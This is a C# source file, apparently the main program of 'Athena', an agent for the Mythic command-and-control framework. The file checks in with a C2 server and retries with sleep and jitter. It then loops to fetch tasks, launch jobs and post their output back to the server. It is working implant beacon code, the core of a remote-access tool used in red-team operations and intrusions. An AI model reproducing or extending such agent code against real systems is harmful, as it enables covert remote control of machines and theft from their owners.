using Athena.Commands;
using Athena.Mythic.Model.Checkin;
using Athena.Mythic.Model;
using Athena.Utilities;
using System.Collections.Generic;
using System.Threading;

namespace Athena
{
    class Program
    {
        static void Main(string[] args)
        {
            //https://www.youtube.com/watch?v=xdmdHMjK1KA
            //1:36:39 for learning how to automatically generate the agents

            //MythicClient controls all of the agent communications
            MythicClient mc = new MythicClient();
            CheckinResponse res = mc.CheckIn();
            //Run in loop, just in case the agent is not able to connect initially to give a chance for network issues to resolve
            while(res.status != "success" || Globals.missedCheckins == Globals.maxMissedCheckins)
            {
                res = mc.CheckIn();
                Thread.Sleep(Misc.GetSleep(mc.MythicConfig.sleep,mc.MythicConfig.jitter));
                Globals.missedCheckins += 1;
            }
            Globals.missedCheckins = 0;
            mc.MythicConfig.uuid = res.id;

            //Main Loop
            //Need to add the missed checkins check here.
            while (!(Globals.missedCheckins == Globals.maxMissedCheckins) & !Globals.exit)
            {
                List<MythicTask> tasks = mc.GetTasks();
                if(tasks.Count > 0)
                {
                    //Kick off Tasks
                    foreach (var task in tasks)
                    {
                        Globals.jobs.Add(task.id,new MythicJob(task));
                    }
                }

                Dictionary<string,MythicJob> hasoutput = new Dictionary<string, MythicJob>();

                //To prevent issues with modifying the array during enumeration
                foreach (var job in Globals.jobs.Keys)
                {
                    if (Globals.jobs[job].hasoutput)
                    {
                        hasoutput.Add(job, Globals.jobs[job]);
                        Globals.jobs[job].hasoutput = false;
                    }
                    else if (!Globals.jobs[job].started)
                    {
                        CommandHandler.StartJob(Globals.jobs[job]);
                    }
                }
                if (hasoutput.Count > 0)
                {
                    mc.PostResponse(hasoutput);
                    foreach (var job in hasoutput.Values)
                    {
                        if (job.complete)
                        {
                            Globals.jobs.Remove(job.task.id);
                        }
                        else
                        {
                            string sent = Globals.jobs[job.task.id].taskresult;
                            //Hopefully this fixes the issue with missing text being returned to the server.
                            Globals.jobs[job.task.id].taskresult = Globals.jobs[job.task.id].taskresult.Replace(sent, "");
                        }
                    }
                }
                Thread.Sleep(Misc.GetSleep(mc.MythicConfig.sleep, mc.MythicConfig.jitter)*1000);
            }
        }
    }
}
